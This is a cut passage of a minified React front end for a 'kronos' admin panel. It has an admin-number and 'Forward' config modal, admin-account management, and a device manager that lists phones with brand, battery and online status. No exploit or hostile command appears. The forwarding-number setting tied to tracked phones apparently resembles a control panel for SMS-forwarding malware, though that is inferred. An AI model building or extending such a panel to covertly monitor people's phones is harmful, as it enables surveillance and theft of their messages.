search or filters"})]}):y.map((z,M)=>i.jsx(yk,{device:z,index:M,onFavoriteToggle:C},z.id))}),i.jsx("style",{children:`
        /* ================================================================
           ENHANCED STATS BAR
           ================================================================ */
        .stats-bar-enhanced {
          display: flex;
          justify-content: space-between;
          align-items: center;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 12px;
          padding: 8px 14px;
          margin-bottom: 10px;
          box-shadow: var(--shadow);
          flex-wrap: wrap;
          gap: 8px;
        }

        .stats-grid-enhanced {
          display: grid;
          grid-template-columns: repeat(4, auto);
          gap: 16px;
          flex: 1;
        }

        .stat-item-enhanced {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 4px 10px;
          border-radius: 8px;
        }

        .stat-item-enhanced .stat-icon {
          font-size: 18px;
        }

        .stat-item-enhanced .stat-number {
          font-size: 18px;
          font-weight: 700;
          color: var(--text-primary);
          display: block;
          line-height: 1.2;
        }

        .stat-item-enhanced .stat-label {
          font-size: 9px;
          font-weight: 600;
          color: var(--text-muted);
          text-transform: uppercase;
          letter-spacing: 0.3px;
          display: block;
        }

        .stat-item-enhanced.online {
          background: rgba(46, 204, 113, 0.06);
          border: 1px solid rgba(46, 204, 113, 0.1);
        }
        .stat-item-enhanced.online .stat-number {
          color: #2ecc71;
        }

        .stat-item-enhanced.ping {
          background: rgba(59, 130, 246, 0.06);
          border: 1px solid rgba(59, 130, 246, 0.1);
        }
        .stat-item-enhanced.ping .stat-number {
          color: #3b82f6;
        }

        .stat-item-enhanced.twentyfour {
          background: rgba(241, 196, 15, 0.06);
          border: 1px solid rgba(241, 196, 15, 0.1);
        }
        .stat-item-enhanced.twentyfour .stat-number {
          color: #f1c40f;
        }

        .stat-item-enhanced.total {
          background: rgba(108, 99, 255, 0.06);
          border: 1px solid rgba(108, 99, 255, 0.1);
        }
        .stat-item-enhanced.total .stat-number {
          color: #6c63ff;
        }

        .stats-actions {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .stats-actions .toggle-btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 4px 12px;
          border-radius: 20px;
          border: 2px solid var(--border-color);
          background: var(--bg-input);
          color: var(--text-secondary);
          font-size: 11px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s ease;
          font-family: inherit;
          min-height: 30px;
        }

        .stats-actions .toggle-btn:active {
          transform: scale(0.95);
        }

        .stats-actions .toggle-btn.active {
          border-color: var(--accent-cyan);
          background: rgba(108, 99, 255, 0.08);
          color: var(--accent-cyan);
          box-shadow: 0 0 20px rgba(108, 99, 255, 0.1);
        }

        /* ================================================================
           RESPONSIVE
           ================================================================ */
        @media (max-width: 600px) {
          .stats-bar-enhanced {
            flex-direction: column;
            align-items: stretch;
          }

          .stats-grid-enhanced {
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
          }

          .stat-item-enhanced {
            padding: 4px 8px;
          }

          .stat-item-enhanced .stat-number {
            font-size: 15px;
          }

          .stats-actions {
            justify-content: center;
            padding-top: 4px;
            border-top: 1px solid var(--border-color);
          }
        }

        @media (max-width: 374px) {
          .stats-grid-enhanced {
            grid-template-columns: 1fr 1fr;
            gap: 4px;
          }

          .stat-item-enhanced {
            padding: 2px 6px;
          }

          .stat-item-enhanced .stat-number {
            font-size: 13px;
          }

          .stat-item-enhanced .stat-label {
            font-size: 7px;
          }
        }
      `})]})}function wk({isOpen:t,onClose:e,onToast:n}){const[r,s]=g.useState(""),[o,a]=g.useState("true"),[l,c]=g.useState(!1);g.useEffect(()=>{t&&d()},[t]);const d=async()=>{try{const u=await hk(),b=u.admin_number||"";s(b.replace(/\D/g,"").slice(-10)),a(u.forward!==void 0?String(u.forward):"true")}catch(u){console.error("Failed to load settings",u)}},p=u=>{let b=u.target.value.replace(/\D/g,"");b.length>10&&(b=b.slice(0,10)),s(b)},f=async()=>{if(r.length!==10){n&&n("❌ Enter 10 digits","error");return}c(!0);try{await mk({admin_number:"+91"+r,forward:o==="true"}),n&&n("✔ CONFIG UPDATED","success"),e()}catch(u){n&&n("❌ UPDATE FAILED","error"),console.error(u)}finally{c(!1)}};return t?i.jsx("div",{className:"modal-overlay",onClick:e,children:i.jsxs("div",{className:"modal-box",onClick:u=>u.stopPropagation(),children:[i.jsx("h2",{children:"⚙ ADMIN CONFIG"}),i.jsx("label",{children:"Admin Number (10 digits)"}),i.jsx("input",{type:"text",placeholder:"Enter 10 digits",maxLength:"10",value:r,onChange:p}),i.jsx("label",{children:"Forward"}),i.jsxs("select",{value:o,onChange:u=>a(u.target.value),children:[i.jsx("option",{value:"true",children:"TRUE"}),i.jsx("option",{value:"false",children:"FALSE"})]}),i.jsx("button",{className:"btn-save",onClick:f,disabled:l,children:l?"⏳ SAVING...":"💾 SAVE"}),i.jsx("button",{className:"btn-cancel",onClick:e,disabled:l,children:"✕ CANCEL"})]})}):null}const Hv=g.createContext(),Sk=({children:t})=>{const[e,n]=g.useState(null),[r,s]=g.useState(null),[o,a]=g.useState(!0),[l,c]=g.useState([]),[d,p]=g.useState(null);g.useEffect(()=>{const m=localStorage.getItem("kronos_user"),h=localStorage.getItem("kronos_session");if(console.log("🔵 AuthProvider: Checking saved session..."),m)try{const y=JSON.parse(m);n(y),s(y),h&&p(h)}catch(y){console.error("❌ Error parsing saved user:",y),localStorage.removeItem("kronos_user"),localStorage.removeItem("kronos_session")}a(!1)},[]),g.useEffect(()=>{if(e&&e.uid){console.log("🔵 Setting up session listener for user:",e.uid);const m=sk(e.uid,h=>{console.log("🔵 Sessions updated:",h.length),c(h)});return()=>{m&&m()}}},[e]);const f=(m,h)=>{console.log("🔵 Login called with:",m,h),n(m),s(m),p(h),localStorage.setItem("kronos_user",JSON.stringify(m)),h&&localStorage.setItem("kronos_session",h)},u=async()=>{console.log("🔵 Logout called");try{await uk()}catch(m){console.error("❌ Logout error:",m)}n(null),s(null),c([]),p(null),localStorage.removeItem("kronos_user"),localStorage.removeItem("kronos_session")},_={user:e,userData:r,loading:o,sessions:l,currentSessionId:d,login:f,logout:u,logoutSpecificDevice:async m=>{if(console.log("🔵 Logout specific device called:",m),!e)return{success:!1,error:"No user logged in"};try{const h=await rk(e.uid,m);if(h.success){const y=await Th(e.uid);return y.success&&c(y.sessions),m===d&&(await u(),window.location.href="/login"),{success:!0}}else throw new Error(h.error)}catch(h){return console.error("❌ Logout specific device error:",h),{success:!1,error:h.message}}},remoteLogoutDevice:async m=>{if(console.log("🔵 Remote logout device called:",m),!e)return{success:!1,error:"No user logged in"};try{await lk(e.uid,m);const h=await Th(e.uid);return h.success&&c(h.sessions),{success:!0}}catch(h){return console.error("❌ Remote logout device error:",h),{success:!1,error:h.message}}},remoteLogoutAll:async()=>{if(console.log("🔵 Remote logout all called for user:",e==null?void 0:e.uid),!e)return{success:!1,error:"No user logged in"};try{return await ck(e.uid),await u(),window.location.href="/login",{success:!0}}catch(m){return console.error("❌ Remote logout all error:",m),{success:!1,error:m.message}}},isAuthenticated:!!e};return i.jsx(Hv.Provider,{value:_,children:t})},xn=()=>{const t=g.useContext(Hv);if(!t)throw new Error("❌ useAuth must be used within AuthProvider");return t};function Ck(){const{user:t,userData:e}=xn(),[n,r]=g.useState([]),[s,o]=g.useState(!0),[a,l]=g.useState(null),[c,d]=g.useState({});g.useEffect(()=>{p()},[]);const p=async()=>{o(!0),l(null);try{const x=B(U,"users"),v=await ce(x);if(v.exists()){const _=v.val(),m=Object.keys(_).filter(h=>_[h].role==="admin").map(h=>({uid:h,..._[h]}));r(m)}else r([])}catch(x){l(x.message)}o(!1)},f=async x=>{if(x===(t==null?void 0:t.uid)){alert("❌ You cannot logout yourself!");return}if(window.confirm("⚠️ Are you sure you want to force logout this admin from ALL devices?")){d(v=>({...v,[x]:!0}));try{const v=B(U,`users/${x}/devices`),_=await ce(v);if(_.exists()){const h=_.val();for(let y in h){const w=B(U,`devices/${y}`);await Rt(w)}await Rt(v)}const m=B(U,`sessions/${x}`);await Rt(m),alert("✅ Admin logged out from all devices successfully!"),await p()}catch(v){alert("❌ Failed to force logout: "+v.message)}d(v=>({...v,[x]:!1}))}},u=async x=>{if(x===(t==null?void 0:t.uid)){alert("❌ You cannot demote yourself!");return}if(window.confirm("⚠️ Are you sure you want to demote this admin to user?")){d(v=>({...v,[x]:!0}));try{const v=B(U,`users/${x}`);await kt(v,{role:"user"}),alert("✅ Admin demoted to user successfully!"),await p()}catch(v){alert("❌ Failed to demote admin: "+v.message)}d(v=>({...v,[x]:!1}))}},b=async x=>{if(x===(t==null?void 0:t.uid)){alert("❌ You cannot delete yourself!");return}if(window.confirm("⚠️ Are you sure you want to permanently delete this admin?")){d(v=>({...v,[x]:!0}));try{const v=B(U,`users/${x}`);await Rt(v),alert("✅ Admin deleted successfully!"),await p()}catch(v){alert("❌ Failed to delete admin: "+v.message)}d(v=>({...v,[x]:!1}))}};return s?i.jsxs("div",{className:"admin-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 Loading admins..."})]}):a?i.jsxs("div",{className:"admin-error",children:[i.jsx("span",{className:"error-icon",children:"❌"}),i.jsx("h3",{children:"Error loading admins"}),i.jsx("p",{children:a}),i.jsx("button",{onClick:p,children:"🔄 Retry"})]}):i.jsxs("div",{className:"admin-management",children:[i.jsxs("div",{className:"admin-header",children:[i.jsx("h2",{children:"🔑 Admin Management"}),i.jsxs("p",{children:["Total Admins: ",i.jsx("strong",{children:n.length})]})]}),i.jsxs("div",{className:"admin-stats",children:[i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"🔑"}),i.jsxs("div",{children:[i.jsx("h3",{children:n.length}),i.jsx("p",{children:"Total Admins"})]})]}),i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"👤"}),i.jsxs("div",{children:[i.jsx("h3",{children:n.filter(x=>x.active!==!1).length}),i.jsx("p",{children:"Active Admins"})]})]}),i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"📱"}),i.jsxs("div",{children:[i.jsx("h3",{children:n.reduce((x,v)=>x+(v.devices?Object.keys(v.devices).length:0),0)}),i.jsx("p",{children:"Total Devices"})]})]})]}),i.jsx("div",{className:"admin-table-container",children:i.jsxs("table",{className:"admin-table",children:[i.jsx("thead",{children:i.jsxs("tr",{children:[i.jsx("th",{children:"#"}),i.jsx("th",{children:"Admin"}),i.jsx("th",{children:"Email"}),i.jsx("th",{children:"Status"}),i.jsx("th",{children:"Devices"}),i.jsx("th",{children:"Actions"})]})}),i.jsx("tbody",{children:n.length===0?i.jsx("tr",{children:i.jsx("td",{colSpan:"6",className:"empty-row",children:"📭 No admins found"})}):n.map((x,v)=>{var _,m,h;return i.jsxs("tr",{children:[i.jsx("td",{children:v+1}),i.jsx("td",{children:i.jsxs("div",{className:"admin-cell",children:[i.jsx("span",{className:"admin-avatar",children:((_=x.name)==null?void 0:_[0])||((m=x.email)==null?void 0:m[0])||"A"}),i.jsxs("div",{children:[i.jsxs("div",{className:"admin-name",children:[x.name||"Unknown",x.uid===(t==null?void 0:t.uid)&&i.jsx("span",{className:"you-badge",children:" (You)"})]}),i.jsxs("div",{className:"admin-uid",children:[(h=x.uid)==null?void 0:h.slice(0,12),"..."]})]})]})}),i.jsx("td",{children:x.email||"N/A"}),i.jsx("td",{children:i.jsx("span",{className:`status-badge ${x.active!==!1?"active":"inactive"}`,children:x.active!==!1?"🟢 Active":"🔴 Inactive"})}),i.jsx("td",{children:i.jsx("span",{className:"device-count",children:x.devices?Object.keys(x.devices).length:0})}),i.jsx("td",{children:i.jsxs("div",{className:"action-buttons",children:[x.uid!==(t==null?void 0:t.uid)&&i.jsxs(i.Fragment,{children:[i.jsx("button",{onClick:()=>f(x.uid),disabled:c[x.uid],className:"action-btn logout",title:"Force logout from all devices",children:"🚪"}),i.jsx("button",{onClick:()=>u(x.uid),disabled:c[x.uid],className:"action-btn demote",title:"Demote to user",children:"⬇️"}),i.jsx("button",{onClick:()=>b(x.uid),disabled:c[x.uid],className:"action-btn delete",title:"Delete admin",children:"🗑️"})]}),x.uid===(t==null?void 0:t.uid)&&i.jsx("span",{className:"self-action-hint",children:"👤 You"})]})})]},x.uid)})})]})}),i.jsx("style",{children:`
        .admin-management {
          padding: 16px;
          background: var(--bg-primary);
          border-radius: 12px;
          max-width: 100%;
        }

        .admin-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 16px;
        }

        .admin-header h2 {
          margin: 0;
          color: var(--text-primary);
          font-size: 18px;
        }

        .admin-header p {
          margin: 0;
          color: var(--text-muted);
          font-size: 13px;
        }

        .admin-stats {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 12px;
          margin-bottom: 16px;
        }

        .stat-card {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 14px;
          display: flex;
          align-items: center;
          gap: 12px;
          border: 1px solid var(--border-color);
          box-shadow: var(--shadow);
        }

        .stat-card .stat-icon {
          font-size: 28px;
        }

        .stat-card h3 {
          margin: 0;
          font-size: 20px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .stat-card p {
          margin: 0;
          font-size: 11px;
          color: var(--text-muted);
        }

        .admin-table-container {
          background: var(--bg-card);
          border-radius: 10px;
          overflow: hidden;
          border: 1px solid var(--border-color);
          overflow-x: auto;
        }

        .admin-table {
          width: 100%;
          border-collapse: collapse;
          min-width: 600px;
        }

        .admin-table th {
          text-align: left;
          padding: 10px 14px;
          font-size: 10px;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          color: var(--text-muted);
          border-bottom: 2px solid var(--border-color);
          background: var(--bg-primary);
          font-weight: 600;
        }

        .admin-table td {
          padding: 8px 14px;
          font-size: 12px;
          color: var(--text-secondary);
          border-bottom: 1px solid var(--border-color);
        }

        .admin-table tr:last-child td {
          border-bottom: none;
        }

        .admin-cell {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .admin-avatar {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          background: linear-gradient(135deg, #f093fb, #f5576c);
          color: white;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 14px;
          text-transform: uppercase;
        }

        .admin-name {
          font-weight: 600;
          color: var(--text-primary);
          font-size: 13px;
        }

        .admin-name .you-badge {
          color: var(--accent-cyan);
          font-weight: 700;
          font-size: 11px;
        }

        .admin-uid {
          font-size: 9px;
          color: var(--text-muted);
          font-family: 'Courier New', monospace;
        }

        .status-badge {
          font-size: 10px;
          font-weight: 600;
          padding: 2px 10px;
          border-radius: 12px;
        }

        .status-badge.active {
          color: #2ecc71;
          background: rgba(46, 204, 113, 0.08);
          border: 1px solid rgba(46, 204, 113, 0.15);
        }

        .status-badge.inactive {
          color: #e74c3c;
          background: rgba(231, 76, 60, 0.06);
          border: 1px solid rgba(231, 76, 60, 0.1);
        }

        .device-count {
          font-size: 13px;
          font-weight: 600;
          color: var(--text-primary);
        }

        .action-buttons {
          display: flex;
          gap: 4px;
          align-items: center;
        }

        .action-btn {
          width: 30px;
          height: 30px;
          border-radius: 6px;
          border: none;
          cursor: pointer;
          font-size: 13px;
          transition: all 0.2s ease;
          background: var(--bg-primary);
          border: 1px solid var(--border-color);
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .action-btn:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .action-btn.logout:hover:not(:disabled) {
          border-color: #f59e0b;
          background: rgba(245, 158, 11, 0.05);
        }

        .action-btn.demote:hover:not(:disabled) {
          border-color: #8b5cf6;
          background: rgba(139, 92, 246, 0.05);
        }

        .action-btn.delete:hover:not(:disabled) {
          border-color: #ef4444;
          background: rgba(239, 68, 68, 0.05);
        }

        .action-btn:active:not(:disabled) {
          transform: scale(0.9);
        }

        .self-action-hint {
          font-size: 12px;
          color: var(--text-muted);
          font-weight: 600;
          padding: 4px 8px;
          background: var(--bg-input);
          border-radius: 4px;
        }

        .empty-row {
          text-align: center;
          padding: 30px;
          color: var(--text-muted);
        }

        .admin-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 40px;
          gap: 12px;
          color: var(--text-muted);
        }

        .loading-spinner {
          width: 36px;
          height: 36px;
          border: 3px solid var(--border-color);
          border-top-color: var(--accent-cyan);
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .admin-error {
          text-align: center;
          padding: 40px;
          color: var(--text-muted);
        }

        .admin-error .error-icon {
          font-size: 48px;
          display: block;
          margin-bottom: 8px;
        }

        .admin-error button {
          margin-top: 12px;
          padding: 8px 20px;
          border: 1px solid var(--border-color);
          border-radius: 6px;
          background: var(--bg-card);
          color: var(--text-primary);
          cursor: pointer;
        }

        @media (max-width: 600px) {
          .admin-stats {
            grid-template-columns: repeat(2, 1fr);
          }

          .admin-table-container {
            overflow-x: auto;
          }

          .admin-table {
            font-size: 11px;
            min-width: 500px;
          }

          .admin-table th,
          .admin-table td {
            padding: 6px 10px;
          }

          .action-btn {
            width: 26px;
            height: 26px;
            font-size: 11px;
          }
        }

        @media (max-width: 374px) {
          .admin-stats {
            grid-template-columns: 1fr;
          }
        }
      `})]})}function jk(){const{user:t}=xn(),[e,n]=g.useState([]),[r,s]=g.useState([]),[o,a]=g.useState(!0),[l,c]=g.useState(null),[d,p]=g.useState({}),[f,u]=g.useState("all"),[b,x]=g.useState("all");g.useEffect(()=>{v()},[]);const v=async()=>{a(!0),c(null);try{const S=B(U,"users"),C=await ce(S),j=C.exists()?C.val():{},P=Object.keys(j).map(F=>({uid:F,...j[F]}));n(P);const z=B(U,"devices"),M=await ce(z),L=M.exists()?M.val():{},K=Object.keys(L).map(F=>({deviceId:F,...L[F]}));s(K)}catch(S){c(S.message)}a(!1)},_=S=>e.find(C=>C.uid===S),m=async(S,C)=>{if(C===(t==null?void 0:t.uid)){alert("❌ You cannot logout your own device!");return}if(window.confirm("⚠️ Are you sure you want to force logout this device?")){p(j=>({...j,[S]:!0}));try{const j=B(U,`users/${C}/devices/${S}`);await Rt(j);const P=B(U,`devices/${S}`);await Rt(P);const z=B(U,`users/${C}/devices`);(await ce(z)).exists()||await kt(B(U,`users/${C}`),{active:!1}),alert("✅ Device logged out successfully!"),await v()}catch(j){alert("❌ Failed to logout device: "+j.message)}p(j=>({...j,[S]:!1}))}},h=async S=>{if(S===(t==null?void 0:t.uid)){alert("❌ You cannot logout your own devices!");return}if(window.confirm("⚠️ Are you sure you want to logout ALL devices of this user?")){p(C=>({...C,["all_"+S]:!0}));try{const C=B(U,`users/${S}/devices`),j=await ce(C);if(j.exists()){const P=j.val();for(let z in P){const M=B(U,`devices/${z}`);await Rt(M)}await Rt(C)}await kt(B(U,`users/${S}`),{active:!1}),alert("✅ All devices logged out successfully!"),await v()}catch(C){alert("❌ Failed to logout all devices: "+C.message)}p(C=>({...C,["all_"+S]:!1}))}},w=(()=>{let S=r;return f!=="all"&&(S=S.filter(C=>C.userId===f)),b==="online"?S=S.filter(C=>C.status==="online"):b==="offline"&&(S=S.filter(C=>C.status==="offline")),S})(),N=r.filter(S=>S.status==="online").length,R=r.filter(S=>S.status==="offline").length;return o?i.jsxs("div",{className:"admin-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 Loading devices..."})]}):l?i.jsxs("div",{className:"admin-error",children:[i.jsx("span",{className:"error-icon",children:"❌"}),i.jsx("h3",{children:"Error loading data"}),i.jsx("p",{children:l}),i.jsx("button",{onClick:v,children:"🔄 Retry"})]}):i.jsxs("div",{className:"admin-device-manager",children:[i.jsxs("div",{className:"admin-header",children:[i.jsx("h2",{children:"📱 Device Manager"}),i.jsxs("p",{children:["Total Devices: ",i.jsx("strong",{children:r.length})]})]}),i.jsxs("div",{className:"admin-stats",children:[i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"📱"}),i.jsxs("div",{children:[i.jsx("h3",{children:r.length}),i.jsx("p",{children:"Total Devices"})]})]}),i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"🟢"}),i.jsxs("div",{children:[i.jsx("h3",{children:N}),i.jsx("p",{children:"Online"})]})]}),i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"🔴"}),i.jsxs("div",{children:[i.jsx("h3",{children:R}),i.jsx("p",{children:"Offline"})]})]}),i.jsxs("div",{className:"stat-card",children:[i.jsx("span",{className:"stat-icon",children:"👤"}),i.jsxs("div",{children:[i.jsx("h3",{children:e.length}),i.jsx("p",{children:"Total Users"})]})]})]}),i.jsxs("div",{className:"filter-section",children:[i.jsxs("div",{className:"filter-group",children:[i.jsx("label",{children:"User:"}),i.jsxs("select",{value:f,onChange:S=>u(S.target.value),className:"filter-select",children:[i.jsx("option",{value:"all",children:"All Users"}),e.map(S=>i.jsx("option",{value:S.uid,children:S.name||S.userId||S.uid},S.uid))]})]}),i.jsxs("div",{className:"filter-group",children:[i.jsx("label",{children:"Status:"}),i.jsxs("div",{className:"filter-buttons",children:[i.jsx("button",{className:`filter-btn ${b==="all"?"active":""}`,onClick:()=>x("all"),children:"All"}),i.jsx("button",{className:`filter-btn ${b==="online"?"active":""}`,onClick:()=>x("online"),children:"🟢 Online"}),i.jsx("button",{className:`filter-btn ${b==="offline"?"active":""}`,onClick:()=>x("offline"),children:"🔴 Offline"})]})]})]}),i.jsx("div",{className:"device-table-container",children:i.jsxs("table",{className:"device-table",children:[i.jsx("thead",{children:i.jsxs("tr",{children:[i.jsx("th",{children:"#"}),i.jsx("th",{children:"Device"}),i.jsx("th",{children:"User"}),i.jsx("th",{children:"Status"}),i.jsx("th",{children:"Battery"}),i.jsx("th",{children:"Last Seen"}),i.jsx("th",{children:"Actions"})]})}),i.jsx("tbody",{children:w.length===0?i.jsx("tr",{children:i.jsx("td",{colSpan:"7",className:"empty-row",children:"📭 No devices found"})}):w.map((S,C)=>{var z,M,L;const j=_(S.userId),P=S.userId===(t==null?void 0:t.uid);return i.jsxs("tr",{children:[i.jsx("td",{children:C+1}),i.jsx("td",{children:i.jsxs("div",{className:"device-cell",children:[i.jsx("span",{className:"device-icon",children:"📱"}),i.jsxs("div",{children:[i.jsxs("div",{className:"device-name",children:[S.brand||"Unknown"," ",S.model||"",P&&i.jsx("span",{className:"own-badge",children:" (You)"})]}),i.jsxs("div",{className:"device-id-small",children:[(z=S.deviceId)==null?void 0:z.slice(0,8),"..."]})]})]})}),i.jsx("td",{children:j?i.jsxs("div",{className:"user-cell",children:[i.jsx("span",{className:"user-avatar",children:((M=j.name)==null?void 0:M[0])||((L=j.userId)==null?void 0:L[0])||"U"}),i.jsx("span",{className:"user-name",children:j.name||j.userId||"Unknown"})]}):i.jsx("span",{className:"no-user",children:"No user"})}),i.jsx("td",{children:i.jsx("span",{className:`status-badge ${S.status==="online"?"online":"offline"}`,children:S.status==="online"?"🟢 Online":"🔴 Offline"})}),i.jsx("td",{children:i.jsxs("div",{className:"battery-cell",children:[i.jsx("span",{className:`battery-icon ${parseInt(S.battery)<20?"low":""}`,children:"🔋"}),i.jsx("span",{className:"battery-value",children:S.battery||"N/A"})]})}),i.jsx("td",{children:i.jsx("span",{className:"last-seen",children:S.lastSeen?new Date(S.lastSeen).toLocaleString():"N/A"})}),i.jsx("td",{children:i.jsxs("div",{className:"action-buttons",children:[!P&&S.userId&&i.jsx("button",{onClick:()=>m(S.deviceId,S.userId),disabled:d[S.deviceId],className:"action-btn logout",title:"Force logout this device",children:"🚪"}),!P&&S.userId&&i.jsx("button",{onClick:()=>h(S.userId),disabled:d["all_"+S.userId],className:"action-btn logout-all",title:"Logout all devices of this user",children:"🔥"}),P&&i.jsx("span",{className:"self-hint",children:"👤 You"})]})})]},S.deviceId)})})]})}),i.jsx("style",{children:`
        .admin-device-manager {
          padding: 16px;
          background: var(--bg-primary);
          border-radius: 12px;
        }

        .admin-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 16px;
        }

        .admin-header h2 {
          margin: 0;
          color: var(--text-primary);
          font-size: 18px;
        }

        .admin-header p {
          margin: 0;
          color: var(--text-muted);
          font-size: 13px;
        }

        .admin-stats {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 12px;
          margin-bottom: 16px;
        }

        .stat-card {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 14px;
          display: flex;
          align-items: center;
          gap: 12px;
          border: 1px solid var(--border-color);
          box-shadow: var(--shadow);
        }

        .stat-card .stat-icon {
          font-size: 28px;
        }

        .stat-card h3 {
          margin: 0;
          font-size: 20px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .stat-card p {
          margin: 0;
          font-size: 11px;
          color: var(--text-muted);
        }

        .filter-section {
          display: flex;
          gap: 16px;
          margin-bottom: 16px;
          flex-wrap: wrap;
          align-items: center;
        }

        .filter-group {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .filter-group label {
          font-size: 11px;
          font-weight: 600;
          color: var(--text-muted);
          text-transform: uppercase;
        }

        .filter-select {
          padding: 6px 12px;
          border: 1px solid var(--border-color);
          border-radius: 6px;
          background: var(--bg-card);
          color: var(--text-primary);
          font-size: 12px;
          outline: none;
        }

        .filter-buttons {
          display: flex;
          gap: 4px;
        }

        .filter-btn {
          padding: 4px 12px;
          border: 1px solid var(--border-color);
          border-radius: 12px;
          background: var(--bg-card);
          color: var(--text-muted);
          font-size: 10px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
        }

        .filter-btn.active {
          border-color: var(--accent-cyan);
          color: var(--accent-cyan);
          background: rgba(108, 99, 255, 0.05);
        }

        .device-table-container {
          background: var(--bg-card);
          border-radius: 10px;
          overflow: hidden;
          border: 1px solid var(--border-color);
          overflow-x: auto;
        }

        .device-table {
          width: 100%;
          border-collapse: collapse;
          min-width: 700px;
        }

        .device-table th {
          text-align: left;
          padding: 10px 14px;
          font-size: 10px;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          color: var(--text-muted);
          border-bottom: 2px solid var(--border-color);
          background: var(--bg-primary);
          font-weight: 600;
        }

        .device-table td {
          padding: 8px 14px;
          font-size: 12px;
          color: var(--text-secondary);
          border-bottom: 1px solid var(--border-color);
        }

        .device-table tr:last-child td {
          border-bottom: none;
        }

        .device-cell {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .device-icon {
          font-size: 20px;
        }

        .device-name {
          font-weight: 600;
          color: var(--text-primary);
          font-size: 12px;
        }

        .device-name .own-badge {
          color: var(--accent-cyan);
          font-weight: 700;
          font-size: 10px;
        }

        .device-id-small {
          font-size: 9px;
          color: var(--text-muted);
          font-family: 'Courier New', monospace;
        }

        .user-cell {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .user-avatar {
          width: 28px;
          height: 28px;
          border-radius: 50%;
          background: linear-gradient(135deg, #6c63ff, #3b82f6);
          color: white;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 12px;
          text-transform: uppercase;
        }

        .user-name {
          font-size: 12px;
          font-weight: 500;
          color: var(--text-primary);
        }

        .no-user {
          color: var(--text-muted);
          font-size: 11px;
        }

        .status-badge {
          font-size: 10px;
          font-weight: 600;
          padding: 2px 10px;
          border-radius: 12px;
        }

        .status-badge.online {
          color: #2ecc71;
          background: rgba(46, 204, 113, 0.08);
          border: 1px solid rgba(46, 204, 113, 0.15);
        }

        .status-badge.offline {
          color: #e74c3c;
          background: rgba(231, 76, 60, 0.06);
          border: 1px solid rgba(231, 76, 60, 0.1);
        }

        .battery-cell {
          display: flex;
          align-items: center;
          gap: 4px;
        }

        .battery-value {
          font-weight: 600;
          font-size: 12px;
          color: var(--text-primary);
        }

        .battery-icon.low {
          color: #e74c3c;
        }

        .last-seen {
          font-size: 10px;
          color: var(--text-muted);
        }

        .action-buttons {
          display: flex;
          gap: 4px;
          align-items: center;
        }

        .action-btn {
          width: 30px;
          height: 30px;
          border-radius: 6px;
          border: none;
          cursor: pointer;
          font-size: 13px;
          transition: all 0.2s ease;
          background: var(--bg-primary);
          border: 1px solid var(--border-color);
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .action-btn:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .action-btn.logout:hover:not(:disabled) {
          border-color: #f59e0b;
          background: rgba(245, 158, 11, 0.05);
        }

        .action-btn.logout-all:hover:not(:disabled) {
          border-color: #ef4444;
          background: rgba(239, 68, 68, 0.05);
        }

        .action-btn:active:not(:disabled) {
          transform: scale(0.9);
        }

        .self-hint {
          font-size: 11px;
          color: var(--text-muted);
          font-weight: 600;
          padding: 4px 8px;
          background: var(--bg-input);
          border-radius: 4px;
        }

        .empty-row {
          text-align: center;
          padding: 30px;
          color: var(--text-muted);
        }

        .admin-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 40px;
          gap: 12px;
          color: var(--text-muted);
        }

        .loading-spinner {
          width: 36px;
          height: 36px;
          border: 3px solid var(--border-color);
          border-top-color: var(--accent-cyan);
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .admin-error {
          text-align: center;
          padding: 40px;
          color: var(--text-muted);
        }

        .admin-error .error-icon {
          font-size: 48px;
          display: block;
          margin-bottom: 8px;
        }

        .admin-error button {
          margin-top: 12px;
          padding: 8px 20px;
          border: 1px solid var(--border-color);
          border-radius: 6px;
          background: var(--bg-card);
          color: var(--text-primary);
          cursor: pointer;
        }

        @media (max-width: 600px) {
          .admin-stats {
            grid-template-columns: repeat(2, 1fr);
          }

          .filter-section {
            flex-direction: column;
            align-items: stretch;
          }

          .filter-group {
            flex-wrap: wrap;
          }

          .device-table-container {
            overflow-x: auto;
          }

